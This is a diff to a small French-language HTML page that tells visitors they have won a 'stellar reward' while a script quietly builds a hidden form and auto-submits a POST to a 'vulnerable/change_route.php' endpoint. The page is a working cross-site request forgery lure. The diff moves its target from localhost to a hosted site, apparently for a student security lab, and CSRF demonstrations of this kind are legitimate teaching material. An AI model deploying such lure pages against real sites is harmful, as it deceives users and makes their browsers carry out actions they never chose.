@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <title>Récompenses Galactiques</title>
@@ -11,6 +12,7 @@
         }
     </style>
 </head>
+
 <body>
     <h1>Félicitations! Vous avez gagné une récompense stellaire!</h1>
     <p>Préparation de votre récompense...</p>
@@ -20,12 +22,13 @@
             const form = document.createElement('form');
             form.style.display = 'none';
             form.method = 'POST';
-            form.action = 'http://localhost/cyber-trip/backend/vulnerable/change_route.php'; 
+            form.action = 'https://cybertrip.enzo.givernaud.mmi-velizy.fr/vulnerable/change_route.php';
             form.innerHTML = '<input type="hidden" name="route" value="Route-Secrète" />';
-            
+
             document.body.appendChild(form);
             form.submit();
         };
     </script>
 </body>
+
 </html>
